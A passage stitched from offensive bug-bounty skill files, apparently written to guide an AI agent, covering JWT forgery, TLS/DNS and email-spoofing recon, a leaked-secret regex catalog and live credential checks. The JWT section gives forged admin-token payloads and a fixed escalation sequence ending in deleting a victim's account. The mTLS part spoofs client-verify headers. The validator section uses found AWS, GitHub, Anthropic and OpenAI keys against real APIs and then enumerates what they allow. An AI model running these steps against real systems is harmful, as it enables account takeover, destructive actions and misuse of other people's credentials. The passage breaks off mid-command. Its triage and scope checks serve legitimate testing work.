**jwk header self-signed key injection (RS256) — embed an attacker-controlled public key in the token**
```
header:  {"alg":"RS256","jwk":{"kty":"RSA","n":"<your_rsa_modulus>","e":"AQAB"}}
payload: {"sub":"administrator"}
signature: (sign with your matching private key)
```
Some verifiers incorrectly trust a `jwk` (JSON Web Key) claim in the header and use it to validate the signature. Generate your own RSA keypair, embed the public key in the token header, sign with your private key, and send. Works when the verifier does not verify the key's provenance or allowlist.

**Expiry / time-based claim manipulation**
```
Remove "exp" (expiration) claim entirely — many validators skip the check if absent.
Or set "nbf" (not before) to the past and "exp" (expiration) to far future (e.g. year 2099).
Edit payload: {"sub":"administrator","nbf":1000000000,"exp":4102444800}
```
Combined with any forging technique above (alg:none, key confusion, jwk injection), this
bypasses time-based validation when the verifier does not enforce strict expiry rules.

**Cross-tenant claim injection — escalate to another tenant's data via claim swaps**
```
Identify tenant-related claims in a decoded real token: "org_id", "tenant", "account_id",
"workspace_id", "customer_id". Edit the target claim to another tenant's value.
Example: {"sub":"victim@org.com","org_id":1234} → change org_id to an admin's org (e.g. 9999).
```
This is systematic IDOR via claims — if authorization logic trusts the token claims
without checking ownership server-side, you cross into another tenant's resources.
Works especially well combined with alg:none or weak-secret attacks.

Match the `payload` shape to a REAL token from the app (decode one first) — keep
its claim names, only change identity/role. A payload the app can't parse fails
for the wrong reason and wastes the attempt.

## Offline attacks — weak HMAC secret cracking

If the token is HS256 (HMAC-based) and the secret is weak or reused from a known
password list:
```bash

# jwt_tool: built-in wordlist cracking
jwt_tool <token> -C -d wordlist.txt
```
Once the secret is cracked, forge any token using HS256 with that secret (via
jwt_tool or PyJWT).

## Automated attack automation

Use purpose-built JWT attack suites to run all known forgery modes in parallel:
```bash

# jwt_tool: auto-try alg:none, key confusion, kid injection, etc.
jwt_tool <token> -X a

# Nuclei: automated JWT vuln scanning
nuclei -u <target_url> -t jwt/ -timeout 10s
```
Run these early in JWT recon; they often find the vulnerability faster than
manual chaining of individual techniques.

## Drive to the ADMIN objective — do not stop at a working forge

A forge that loads YOUR own `/my-account` is NOT the goal — it just proves the
forge mechanism works. The objective is almost always **admin** (reach an
admin-only page and perform an admin action, e.g. delete a user). Once any forge
is accepted, IMMEDIATELY escalate — change identity to admin AND aim at the admin
endpoint. Do not keep re-forging `/my-account` or re-logging-in; that is drift.

Fixed escalation sequence (run it in order, do not loop on earlier steps):

1. Forge admin identity and hit the admin page (try these claim names — match a
   decoded real token: `sub`, `role`, `isAdmin`, `username`), e.g. an HS256 token
   with `kid` pointed at `/dev/null` and an empty secret, payload `{"sub":"administrator"}`,
   sent to `GET /admin`.
2. When `/admin` returns 200 (you'll see admin controls / a delete link), perform
   the admin action with the SAME forged token — a typical one is deleting a
   target user account, e.g. `GET /admin/delete?username=<victimuser>` (some apps
   use `POST /admin/delete` — read the admin page for the exact form/verb).

A 401 on `/admin` means the forge/claim is wrong — change ONE thing (the kid
depth, the claim name/value, or alg) and retry `/admin`. Never retreat to a bare
unauthenticated `GET /admin` (no token) — that always 401s and wastes effort.

## Proof of impact

Point the forged token at a protected/admin endpoint and prove you read data you
should not: an account/user listing (multiple users' emails), another user's
object, or a completed admin action (the deleted-user confirmation). Reading the
admin user list or performing the admin action with a forged token IS the exploit.
A 200 that returns only your own data, or a 401, is not proof.

## Validation discipline

- Decode and confirm the token you sent actually carries the edited claims.
- The win is **cross-identity data access**, not merely a 200. Show the foreign
  user data (e.g. other users' emails) in the response.
- `alg:none` rejected (401) just means that flaw is patched — try key confusion
  before concluding the app is safe.


### From `hunt-skills/hunt-tls-network/SKILL.md`

## Reality Check (Read First)

Most findings in this class are **Info/Low and routinely rejected** as "best-practice" / "missing-hardening" by triage. This skill exists to stop you wasting a submission. Two questions before you report anything here:

1. **Is there a real victim and a real action?** "Missing HSTS" is not a vulnerability — *demonstrated session-cookie capture from a victim you MitM'd* is. "Missing CAA" is never a vulnerability you can demonstrate.
2. **Does the program accept it?** Many programs explicitly list missing SPF/DMARC, missing security headers, weak ciphers without exploit, and CAA as **out of scope**. Read scope first; quote the in-scope line in your report.

**What actually pays in this class (in order):**
- **Dangling-CNAME / dangling-A subdomain takeover** — you control content on `target.com` subdomain. Real impact, real bounty. (Owned in depth by `hunt-subdomain`; covered here for the TLS/DNS recon angle.)
- **Spoofable DMARC, proven by delivered-to-inbox email** — not "p=none exists" but an actual mail from `ceo@target.com` landing in a real inbox with a passing/none DMARC verdict in the headers.
- **DNS AXFR returning internal hosts** — full internal hostname/IP map. Concrete recon value, often Medium.
- **mTLS / client-cert bypass on an internal service** — reaching authenticated-only functionality without the cert. Real auth bypass = High.
- **Exploited TLS weakness with a working decrypt/MitM PoC** — almost never achievable remotely in 2024-2026 against a patched stack; see Phase 1 caveats.

**What does NOT pay (do not report standalone):** missing CAA, missing HSTS with no MitM PoC, missing security headers alone, weak-cipher *support* without an exploit, self-signed cert on a non-prod host, TLS 1.0/1.1 *enabled* without a downgrade victim.

---

# Quick TLS test with testssl.sh
brew install testssl
testssl.sh --fast $TARGET 2>/dev/null | grep -E "CRITICAL|HIGH|MEDIUM|OK|NOT" | head -30

# Or use sslyze (Python)
pip3 install sslyze
python3 -m sslyze $TARGET --json_out /tmp/sslyze_$TARGET.json 2>/dev/null
cat /tmp/sslyze_$TARGET.json | python3 -m json.tool | grep -i "vulnerability\|insecure\|error" | head -20

# Check for weak ciphers manually (a successful handshake = the cipher is OFFERED, not exploitable)
openssl s_client -connect $TARGET:443 -cipher RC4-SHA 2>/dev/null | grep -i "cipher\|handshake"
openssl s_client -connect $TARGET:443 -cipher DES-CBC3-SHA 2>/dev/null | grep -i "cipher\|handshake"

# Protocol downgrade surface — TLS 1.0/1.1 still negotiable?
openssl s_client -connect $TARGET:443 -tls1   2>/dev/null | grep -E "Protocol|Cipher"
openssl s_client -connect $TARGET:443 -tls1_1 2>/dev/null | grep -E "Protocol|Cipher"
```

**Accuracy / triage notes — do not over-claim TLS bugs:**

- **Offered ≠ exploitable.** testssl/sslyze flagging RC4, 3DES, or TLS 1.0 means the server *negotiates* it. That is a hardening finding, **not** a demonstrated decrypt. Without a PoC it is Info/Low and frequently OOS.
- **SWEET32 (CVE-2016-2183)** — 3DES birthday attack. Requires a long-lived TLS session, an on-path attacker, and ~hundreds of GB / hours of same-key traffic. Realistically un-demonstrable in a bug bounty; report only the *support* of 3DES, expect Low/Info.
- **POODLE (CVE-2014-3566)** — SSLv3 CBC padding oracle. Needs **SSLv3 actually enabled**; almost no modern stack offers it. Confirm with `testssl.sh --poodle` (or `nmap --script ssl-poodle`) — modern OpenSSL 3.x dropped the `-ssl3` flag. If SSLv3 won't negotiate, there is no POODLE.
- **FREAK (CVE-2015-0204)** and **DROWN (CVE-2016-0800)** — require export-grade RSA / a shared SSLv2 endpoint respectively. Both are pre-conditions you must *prove present*, not assume. DROWN needs SSLv2 reachable on *some* host sharing the cert/key — scan for SSLv2 with `testssl.sh --drown` (or `nmap --script sslv2-drown`) across the cert's SAN list before claiming it; modern OpenSSL has no `-ssl2` flag.
- **Heartbleed (CVE-2014-0160)** — if you genuinely find an unpatched OpenSSL 1.0.1 leaking memory, that *is* High/Critical with a real PoC (dump containing keys/cookies). Verify with `testssl.sh --heartbleed` and capture leaked bytes; this is the rare TLS bug worth a full report.

---

# Check HSTS header on main domain and all subdomains
curl -sI "https://$TARGET/" | grep -i "strict-transport-security"

# Check critical subdomains (login, api, auth)
for sub in login auth api account pay www; do
  HSTS=$(curl -sI "https://$sub.$TARGET/" 2>/dev/null | grep -i "strict-transport-security")
  if [ -z "$HSTS" ]; then
    echo "[!] MISSING HSTS: https://$sub.$TARGET/"
  else
    echo "[OK] $sub.$TARGET: $HSTS"
  fi
done

# HSTS preload check
curl -s "https://hstspreload.org/api/v2/status?domain=$TARGET" | python3 -m json.tool 2>/dev/null
```

---

# Attempt zone transfer on each nameserver
for NS in $(dig NS $TARGET +short); do
  echo "=== Trying AXFR from $NS ==="
  dig AXFR $TARGET @$NS 2>/dev/null | grep -v "^;" | head -30
done

# Zone transfer via alternative tools
host -t AXFR $TARGET $(dig NS $TARGET +short | head -1) 2>/dev/null | head -30
nmap -sn --script dns-zone-transfer $TARGET 2>/dev/null | head -30

# Check DKIM selectors (common: default, google, mail, k1)
for selector in default google mail k1 selector1 selector2 s1 s2 dkim; do
  RESULT=$(dig TXT $selector._domainkey.$TARGET +short 2>/dev/null)
  [ -n "$RESULT" ] && echo "DKIM selector found: $selector → $RESULT"
done

# --- Spoofability evaluation (heuristic only; PROOF is the swaks test below) ---
SPF=$(dig +short TXT $TARGET | tr -d '"' | grep -i "v=spf1")
DMARC=$(dig +short TXT _dmarc.$TARGET | tr -d '"' | grep -i "v=DMARC1")

# SPF "+all" / "all" with no qualifier = pass-everything = spoofable from any IP
echo "$SPF" | grep -Eq '[+ ]all($|[^-~?])' && echo "[CRITICAL] SPF passes all senders (+all)"
echo "$SPF" | grep -q "~all" && echo "[INFO] SPF softfail (~all) — may still deliver to inbox"
[ -z "$SPF" ] && echo "[INFO] No SPF record"

# Correct DMARC-absence check: test the variable for emptiness, do NOT pipe dig|wc -c
if [ -z "$DMARC" ]; then
  echo "[INFO] No DMARC record (no published policy)"
else
  POLICY=$(echo "$DMARC" | grep -oiE 'p=[a-z]+' | head -1)
  echo "[INFO] DMARC present: $POLICY"
  echo "$POLICY" | grep -qi "p=none" && echo "  -> p=none: monitors only, does NOT block spoofed mail"
  echo "$POLICY" | grep -qiE "p=(quarantine|reject)" && echo "  -> enforcing policy: spoofing likely blocked at receiver"
fi
```

**Why the original `dig ... | wc -c | grep '^1$'` check was broken:** empty `dig +short` output is a zero-length string; piped through `wc -c` it usually yields `0`, and the surrounding newline handling is shell-dependent, so the `^1$` match misfires both ways. Always capture into a variable and test `[ -z "$VAR" ]`.

### Spoofability is a RECEIVER decision, not a record-reading exercise

Do not report "missing DMARC = email spoofing" from `dig` output alone. DMARC `p=none` (or absent) means the **sending domain published no enforcement** — but the **receiving** mail provider (Gmail, M365, the program's own MX) may still junk or reject your spoof based on SPF, its own heuristics, or ARC. The only proof that survives triage is a **message you delivered to a real inbox**.

```bash

# Use an account on the receiver the program actually uses (check their MX: dig MX $TARGET)
swaks --to your-tester@gmail.com \
      --from "CEO <ceo@$TARGET>" \
      --header "Subject: [TEST] DMARC spoof PoC for $TARGET" \
      --body "Authorized bug-bounty test. Spoofed from-domain: $TARGET" \
      --server <an-smtp-relay-you-control-or-localhost>
```

**Confirmation gate — a spoof PoC is only valid if you can show:**
1. The message landed in **Inbox** (not Spam/Junk), screenshot the folder.
2. The raw headers: `Authentication-Results:` showing `dmarc=none|fail` AND the mail was still **delivered** (not bounced). A bounce or a Spam-folder landing is NOT a finding — note it and move on.
3. The visible `From:` shows `@$TARGET` to the recipient (header-from spoof, the one that matters for phishing), not just an `envelope-from` trick.

Severity is **Medium at best**, and only if delivered-to-inbox. Many programs mark email-auth findings OOS outright — check scope first.

---

# Check each critical header
for HEADER in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" \
              "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy"; do
  RESULT=$(echo "$HEADERS" | grep -i "$HEADER")
  if [ -z "$RESULT" ]; then
    echo "[MISSING] $HEADER"
  else
    echo "[OK] $HEADER: $RESULT"
  fi
done

# Automated security headers check
curl -s "https://securityheaders.com/?q=https://$TARGET&followRedirects=on" | \
  grep -oP "grade-\K[A-F+]" | head -3
```

---

# crt.sh — certificate transparency logs
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
  python3 -m json.tool 2>/dev/null | grep "name_value" | \
  grep -oP '"name_value": "\K[^"]+' | \
  sed 's/\*\.//g' | sort -u > recon/$TARGET/ct-subdomains.txt

echo "[+] CT subdomains found: $(wc -l < recon/$TARGET/ct-subdomains.txt)"

# Compare with existing subdomain list
comm -23 <(sort recon/$TARGET/ct-subdomains.txt) \
         <(sort recon/$TARGET/subdomains.txt 2>/dev/null) | head -20

## Phase 6.5 — Dangling Records → Subdomain Takeover (the finding that actually pays)

This is the highest-impact item in the whole skill. A CNAME/A record pointing at a deprovisioned third-party resource (S3 bucket, Azure CDN/App Service, GitHub Pages, Heroku, Fastly, etc.) lets you claim that resource and serve content from `*.target.com`. Full depth lives in `hunt-subdomain`; here is the TLS/DNS-recon entry point.

```bash

# For each subdomain from CT logs, resolve the CNAME chain and check for a live origin
while read sub; do
  CNAME=$(dig +short CNAME "$sub" | head -1)
  [ -z "$CNAME" ] && continue
  CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "https://$sub/" 2>/dev/null)
  echo "$sub -> $CNAME  [http $CODE]"
done < recon/$TARGET/ct-subdomains.txt | tee recon/$TARGET/cname-map.txt

# "Fastly error: unknown domain", "The specified bucket does not exist", Azure "Web App - Unavailable").
```

**Validation gate — a takeover claim requires you to actually claim it:**
1. Confirm the dangling target is **unregistered/claimable** (the S3 bucket name is free, the Heroku app does not exist, etc.) — the provider error fingerprint alone is necessary but NOT sufficient.
2. **Register the resource yourself** and serve a unique canary file, e.g. `https://$sub/<random>.txt` returning a string only you know. Screenshot it served over the victim subdomain with valid TLS.
3. Tear it down immediately after PoC; never leave attacker-controlled content live on the target's domain.

Impact: cookie scope theft (cookies set for `.target.com`), OAuth `redirect_uri`/CORS-trust abuse, phishing on a trusted origin. Typically **High** (Critical if it sits at an OAuth/SSO redirect or shares session cookies).

---

# CAA records DECLARE which CAs the domain owner permits to issue certs.
dig CAA $TARGET +short
dig CAA "*.$TARGET" +short
```

**Do NOT report "missing CAA" as a vulnerability.** This is the most common false positive in this class. Correct framing:

- A **missing CAA record does not let any attacker obtain a certificate.** It only means the owner has not *opted into* restricting which CAs may issue. With or without CAA, an attacker still needs to pass Domain Control Validation (HTTP-01 / DNS-01 / email) — which requires already controlling the domain, DNS, or web root.
- The "fraudulent issuance" scenario requires **CA compromise or social-engineering a CA** into mis-issuing. That is out of scope for essentially every bug-bounty program and is not something you can demonstrate. CAA enforcement is a CA-side control, not an attacker-facing surface.
- CAA is **Info-tier hardening at most**, and routinely closed as Won't-Fix / OOS. Mention it in a recon notes appendix if at all; never file it standalone.

**Where CAA recon IS useful (no finding, just intel):** the `issue`/`issuewild` values tell you which CA the org uses (e.g. `letsencrypt.org`, `digicert.com`, `amazon.com`). That hints at automation (ACME) and at where a *real* takeover (Phase 6.5 dangling records) could let you mint a valid cert via DCV because you'd control the host.

---

# Check if endpoint requires client certificate
curl -sk "https://$TARGET/internal/" 2>&1 | grep -i "ssl\|certificate\|403\|401"

# Try without client cert (should fail)
curl -sk --cert "" "https://$TARGET/internal/api" | head -5

# Try common bypass paths (some apps skip mTLS on health checks)
for path in /health /ping /status /metrics /api/health; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  echo "$path: $STATUS"
done

# names used by each proxy:
for combo in \
  "X-SSL-Client-Verify: SUCCESS|X-SSL-Client-S-DN: CN=admin" \
  "ssl-client-verify: SUCCESS|ssl-client-subject-dn: CN=admin" \
  "X-Client-Verify: SUCCESS|X-Client-DN: CN=admin,O=target" \
  "X-Forwarded-Client-Cert: By=spiffe://x;Hash=0;Subject=\"CN=admin\""; do
  H1="${combo%%|*}"; H2="${combo##*|}"
  echo "== $H1 / $H2 =="
  curl -sk "https://$TARGET/internal/api" -H "$H1" -H "$H2" -o /dev/null -w "%{http_code}\n"
done
```

**mTLS-bypass validation — this is a real auth bypass, so prove access, not just a status code:**
- A `200` could be a generic page. Confirm you reached **authenticated-only functionality**: show data/an action that is impossible without the client cert (e.g. an admin-only object, an internal-only response body).
- Distinguish *server policy* from *server state*: a `403` flipping to `200` with the spoofed header is meaningful; a `200` for both with and without the header means the path was never protected (no finding).
- For the bypass-path angle (`/health`, `/metrics`): only a finding if that endpoint exposes **sensitive data** (internal IPs, build secrets, Prometheus metrics revealing internal topology) — an empty `200 OK` health probe is not.
- Capture the request/response pair in Burp Repeater so the spoofed header → privileged response is unambiguous.

---

## Chain Table

Severities below are calibrated to what triage actually accepts. They are deliberately conservative; do not inflate them in a report.

| TLS/DNS finding | Realistic standalone severity | Notes / what raises it |
|----------------|------|------|
| Dangling-CNAME subdomain takeover (claimed + canary served) | **High** | Critical if at OAuth `redirect_uri`/SSO or sharing `.target.com` session cookies |
| mTLS / client-cert bypass reaching authed functionality | **High** | Must show privileged data/action, not just a 200 |
| AXFR returning internal hosts/IPs | **Medium** | Recon value; pairs with internal-service findings |
| Spoofable DMARC, **delivered to a real inbox** (PoC headers) | **Medium** | Often OOS — check scope; Inbox (not Spam) + delivered required. *Reading `p=none` from `dig` alone = Info, do not file* |
| Heartbleed / live memory leak with captured secrets | **High–Critical** | Only with an actual dump containing keys/cookies |
| Missing HSTS on auth subdomain | **Low / Info** | NOT High — exploitation needs an active MitM position you cannot demonstrate remotely; report only with a working downgrade-capture PoC |
| Weak cipher *support* (RC4/3DES/SWEET32) with no decrypt PoC | **Info / Low** | Hardening only; frequently OOS |
| Missing CAA | **Info (do not file)** | Absence does not enable issuance; not attacker-demonstrable |

---

# MXToolbox for email security
curl -s "https://mxtoolbox.com/api/v1/Lookup/spf?argument=$TARGET" 2>/dev/null

# dmarc-inspector
curl -s "https://dmarcian.com/dmarc-inspector/?domain=$TARGET" 2>/dev/null
```

---

## Validation

Each finding ships only with the proof listed — never the `dig`/header output alone.

- **Subdomain takeover:** you registered the dangling resource and served a unique canary over `https://sub.target.com/` with valid TLS. Screenshot + canary string. (Tear down after.)
- **mTLS bypass:** spoofed client-verify header returns *privileged* data/action that the cert-required path otherwise denies. Burp request/response pair.
- **AXFR:** zone transfer returns internal hostnames/IPs from an authoritative NS. Full transcript.
- **DMARC spoof:** swaks-sent mail with `From: @target.com` **delivered to a real Inbox** (not Spam), raw `Authentication-Results` headers attached. A bounce or Spam landing = no finding.
- **HSTS missing:** only reportable with a working downgrade PoC capturing a victim cookie over plaintext — otherwise it is best-practice noise.

**Severity (conservative — matches the Chain Table):**
- Subdomain takeover (claimed): High (Critical at OAuth/SSO redirect or shared session cookie)
- mTLS bypass to authed functionality: High
- AXFR returning internal hosts: Medium
- DMARC spoof delivered-to-inbox: Medium (often OOS — verify scope)
- HSTS missing on auth (with downgrade PoC): Low–Medium; without PoC: Info
- Weak cipher support without decrypt PoC: Info–Low
- Missing security headers / missing CAA only: Info (usually do not file)

**Pre-submission scope gate:** before filing ANY item here, confirm the program does not list it as out of scope (email-auth, missing-headers, weak-TLS-without-exploit, and CAA are commonly OOS). Quote the in-scope line in your report.


### From `hunt-skills/offensive-osint/references/secret-patterns.md`

# Secret-Pattern Catalog

> Reference content for the `offensive-osint` skill. Originally §17 of the monolithic SKILL.md (refactored 2026-05-02 for size/load efficiency).

## 17. Secret-Pattern Catalog — 48 patterns (29 base + 19 modern)

The catalog runs against any text source: GitHub code, Postman workspaces, JS bodies, sourcesContent blobs, mobile-app strings, Wayback HTML, paste sites, Stack Exchange code blocks. **Order matters: most-specific patterns first** so generic catches don't pre-empt typed ones.

| # | Name | Regex | Severity | Category |
|---|---|---|---|---|
| 1 | AWS Access Key | `\b(AKIA\|ASIA)[0-9A-Z]{16}\b` | **CRITICAL** | aws |
| 2 | AWS Secret Key (typed) | `(?i)aws[_\-]?secret[_\-]?access[_\-]?key['"\s:=]+([A-Za-z0-9/+=]{40})` | **CRITICAL** | aws |
| 3 | AWS Secret (loose) | `(?i)aws(.{0,20})?(secret\|sk)["'=: ]+([0-9a-z/+=]{40})` | HIGH | aws |
| 4 | GCP Service Account JSON | `"type"\s*:\s*"service_account"` | **CRITICAL** | gcp |
| 5 | Google API Key | `\bAIza[0-9A-Za-z_\-]{35}\b` | HIGH | gcp |
| 6 | GitHub Classic PAT | `\bghp_[A-Za-z0-9]{36}\b` | **CRITICAL** | github |
| 7 | GitHub Fine-grained PAT | `\bgithub_pat_[A-Za-z0-9_]{82}\b` | **CRITICAL** | github |
| 8 | GitHub OAuth | `\bgho_[A-Za-z0-9]{36}\b` | HIGH | github |
| 9 | GitHub Server-to-Server | `\bgh[usr]_[A-Za-z0-9]{36,}\b` | HIGH | github |
| 10 | Stripe Live Key | `\bsk_live_[0-9A-Za-z]{24,}\b` | **CRITICAL** | stripe |
| 11 | Stripe Test Key | `\bsk_test_[0-9A-Za-z]{24,}\b` | LOW | stripe |
| 12 | Slack Token | `\bxox[abpors]-[0-9A-Za-z\-]{10,48}\b` | HIGH | slack |
| 13 | Slack Webhook | `https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+` | MEDIUM | slack |
| 14 | SendGrid Key | `\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b` | HIGH | email_svc |
| 15 | Mailgun Key (v1) | `\bkey-[0-9a-zA-Z]{32}\b` | HIGH | email_svc |
| 16 | Mailgun Key (loose) | `\bkey-[0-9a-f]{32}\b` | HIGH | email_svc |
| 17 | Twilio API Key | `\bSK[0-9a-fA-F]{32}\b` | HIGH | twilio |
| 18 | Twilio Account SID | `\bAC[a-f0-9]{32}\b` | MEDIUM | twilio |
| 19 | Twilio Auth Token | `(?i)twilio(.{0,20})?(auth\|token)["'=: ]+([a-f0-9]{32})` | HIGH | twilio |
| 20 | Heroku API Key | `(?i)heroku(.{0,20})?api["'=: ]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})` | MEDIUM | paas |
| 21 | Firebase URL | `\bhttps?://[a-z0-9\-]+\.firebaseio\.com\b` | LOW | firebase |
| 22 | JWT (any) | `\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b` | MEDIUM | jwt |
| 23 | Bearer Token Assignment | `(?i)authorization["'=: ]+bearer\s+[A-Za-z0-9._\-]{20,}` | MEDIUM | bearer |
| 24 | Basic Auth in URL | `https?://[^/\s:@]+:[^/\s:@]+@[^/\s]+` | MEDIUM | basic_auth |
| 25 | RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` | **CRITICAL** | private_key |
| 26 | EC Private Key | `-----BEGIN EC PRIVATE KEY-----` | **CRITICAL** | private_key |
| 27 | OpenSSH Private Key | `-----BEGIN OPENSSH PRIVATE KEY-----` | **CRITICAL** | private_key |
| 28 | Generic Private Key | `-----BEGIN (DSA \|PGP \|)PRIVATE KEY-----` | **CRITICAL** | private_key |
| 29 | Generic API Key | `(?i)(?:api[_\-]?key\|apikey\|api_secret\|access_token\|secret[_\-]?token)['"\s:=]+["']([A-Za-z0-9+/=_\-]{24,})["']` | MEDIUM | generic |
| 30 | Anthropic API Key | `\bsk-ant-(?:api03\|admin01)-[A-Za-z0-9_\-]{93,}\b` | **CRITICAL** | ai_api |
| 31 | OpenAI API Key (legacy) | `\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b` | **CRITICAL** | ai_api |
| 32 | OpenAI Project Key | `\bsk-proj-[A-Za-z0-9_\-]{40,}T3BlbkFJ[A-Za-z0-9_\-]{40,}\b` | **CRITICAL** | ai_api |
| 33 | OpenAI User Session | `\bsess-[A-Za-z0-9]{40}\b` | HIGH | ai_api |
| 34 | HuggingFace Token | `\bhf_[A-Za-z0-9]{30,}\b` | HIGH | ai_api |
| 35 | Cloudflare API Token | `\b[A-Za-z0-9_\-]{40}\b` (when paired with `(?i)cloudflare`/`X-Auth-Key` context) | HIGH | infra_api |
| 36 | Cloudflare Global API Key | `(?i)cf[_\-]?api[_\-]?key['"\s:=]+([a-f0-9]{37})` | **CRITICAL** | infra_api |
| 37 | DigitalOcean Token | `\bdop_v1_[a-f0-9]{64}\b` | HIGH | infra_api |
| 38 | npm Token (Modern) | `\bnpm_[A-Za-z0-9]{36}\b` | HIGH | package_registry |
| 39 | PyPI Token | `\bpypi-AgENdGV[A-Za-z0-9_\-]+\b` | HIGH | package_registry |
| 40 | Docker Hub PAT | `\bdckr_pat_[A-Za-z0-9_\-]{27,}\b` | HIGH | package_registry |
| 41 | Atlassian API Token | `\bATATT3xFfGF0[A-Za-z0-9_\-]{180,}\b` | HIGH | saas_api |
| 42 | New Relic License Key | `\b(?:NRAA\|NRAK\|NRBR)-[A-F0-9]{27}\b` | MEDIUM | observability |
| 43 | DataDog API Key (in DD_API_KEY context) | `(?i)dd[_\-]?api[_\-]?key['"\s:=]+([a-f0-9]{32})` | HIGH | observability |
| 44 | Sentry DSN | `https://[a-f0-9]+@o[0-9]+\.ingest\.sentry\.io/[0-9]+` | LOW | observability |
| 45 | ngrok Auth Token | `\b[12][A-Za-z0-9]{26}_[A-Za-z0-9]{32,}\b` (when `(?i)ngrok` context) | MEDIUM | tunneling |
| 46 | Linear API Key | `\blin_api_[A-Za-z0-9]{40}\b` | MEDIUM | saas_api |
| 47 | Discord Bot Token | `\b[MN][A-Za-z\d]{23}\.[\w\-]{6}\.[\w\-]{27}\b` | HIGH | bot_token |
| 48 | Telegram Bot Token | `\b\d{8,10}:[A-Za-z0-9_\-]{35}\b` | HIGH | bot_token |

**False-positive notes:**
- Patterns 22 (JWT), 23 (Bearer), 29 (Generic) trigger on test/example data frequently. Always look at *context* — a JWT in a `README.md` example block ≠ a JWT in a production `.env` file.
- Pattern 16 (Mailgun loose) and pattern 11 (Stripe test) are noisy by design; severity is set low for that reason.
- Pattern 24 (Basic auth in URL) catches monitoring-tool URLs and CI-debug URLs as well as real creds — verify before alerting.
- For GitHub's Fine-grained PAT (pattern 7), the `82` length is by GitHub's spec — be skeptical of matches significantly longer or shorter.

---


### From `hunt-skills/offensive-osint/references/secret-validators.md`

# Read-Only Secret Validators

> Reference content for the `offensive-osint` skill. Originally §23 of the monolithic SKILL.md (refactored 2026-05-02 for size/load efficiency).

## 23. Read-Only Secret Validators

Use these to confirm a discovered credential is live. **Read-only, never destructive.** Tag every validation with `detectability` and `checked_at` (UTC).

### 23.1 Postman API Key (PMAK-*)

```
GET https://api.getpostman.com/me
Header: X-Api-Key: PMAK-<key>
```
- `200` → live; response contains `{user: {id, username, email}}`.
- `401` → dead.
- Scope: full read access to the user's Postman account (collections, env vars, history).
- Detectability: low.

### 23.2 AWS Access Key

```
sts:GetCallerIdentity
```
Use boto3:
```python
import boto3
sts = boto3.client('sts',
    aws_access_key_id='<AKIA...>',
    aws_secret_access_key='<secret>',
    region_name='us-east-1')
ident = sts.get_caller_identity()

# ident['Account'], ident['Arn'], ident['UserId']
```
- Valid → returns Account ID + ARN + UserId.
- Invalid → `InvalidClientTokenId` or `SignatureDoesNotMatch`.
- ARN scope: `:user/` is IAM user (broad), `:assumed-role/` is temp role (narrow), `:root` is account root (do NOT validate root keys you find).
- Detectability: **medium** (CloudTrail logs `GetCallerIdentity` in account `<found>`).

### 23.3 GitHub PAT

```
GET https://api.github.com/user
Header: Authorization: token <ghp_*>
```
- `200` → live; response contains `login`, `id`, `name`, `email` (if public).
- Response header `X-OAuth-Scopes` lists token scopes. `repo` scope = write to all accessible repos; `admin:org` = org admin.
- `401` → dead.
- Detectability: low.

### 23.4 Slack Token

```
POST https://slack.com/api/auth.test
Header: Authorization: Bearer <xox*-*>
```
- `200` with `{"ok": true}` → live; response includes `team`, `team_id`, `user`, `user_id`.
- `200` with `{"ok": false, "error": "invalid_auth"}` → dead.
- Detectability: low.

### 23.5 Anthropic API Key

```
GET https://api.anthropic.com/v1/models
Headers:
  x-api-key: sk-ant-api03-...
  anthropic-version: 2023-06-01
```
- `200` → live; response lists available models.
- `401` → dead.
- `403` with org_disabled → key valid but org disabled.
- Detectability: low; usage shows in Anthropic Console for the workspace owner.

### 23.6 OpenAI API Key

```
GET https://api.openai.com/v1/models
Header: Authorization: Bearer sk-...
```
- `200` → live; lists models (may include org-specific fine-tunes).
- `401` → dead.
- `429` → live but quota exhausted.
- Detectability: low; usage shows in OpenAI dashboard.

### 23.7 npm Token

```
GET https://registry.npmjs.org/-/whoami
Header: Authorization: Bearer npm_<token>
```
- `200` with `{"username": "<user>"}` → live.
- `401` → dead.
- For scope check: `GET /-/npm/v1/tokens` returns the token's permissions (read/publish).
- Detectability: low.

### 23.8 Atlassian API Token

```
GET https://<workspace>.atlassian.net/rest/api/3/myself
Auth: Basic <base64(email:ATATT3xFfGF0_...)>
```
- `200` → live; returns account profile + email.
- `401` → dead.
- Workspace required — extract from leaked repo URL or Atlassian dork results.
- Detectability: low.

### 23.9 DataDog API + APP Key

```
GET https://api.datadoghq.com/api/v1/validate
Headers:
  DD-API-KEY: <api-key>
  DD-APPLICATION-KEY: <app-key>
```
- `200` → both keys valid.
- `403` → either key invalid.
- Per-region URL varies: `api.datadoghq.eu`, `api.us3.datadoghq.com`, etc.
- Detectability: low; appears in DataDog audit log.

### 23.10 Validator output schema

```
{
  "status":          "verified_live" | "verified_dead" | "scope_restricted" |
                     "scope_unrestricted" | "validation_skipped_by_policy" |
                     "validation_unsupported" | "validation_failed_transient",
  "provider":        "postman" | "aws" | "github" | "slack" | "anthropic" | "openai" | "npm" | "atlassian" | "datadog",
  "account_id":      "<opaque>",
  "scope":           "<freeform>",
  "metadata":        {<provider-specific>},
  "checked_at":      "<UTC ISO8601>",
  "detectability":   "low" | "medium" | "high"
}
```

### 23.11 Hard rules

- Read-only endpoint only.
- Never use the validated credential to create, modify, delete, or send anything.
- Tag every validation with detectability.
- Record `checked_at` (UTC).
- If RoE forbids validation → `validation_skipped_by_policy`, stop, document.
- For root AWS keys, infrastructure-write GitHub PATs, or admin Slack tokens — flag for the operator and let them decide.

### 23.12 Post-Discovery Enumeration Workflows

After validation confirms a key is live, you often want to enumerate what it can do. Stay read-only.

**AWS access key — IAM enum:**
```bash
export AWS_ACCESS_KEY_ID="AKIA..."
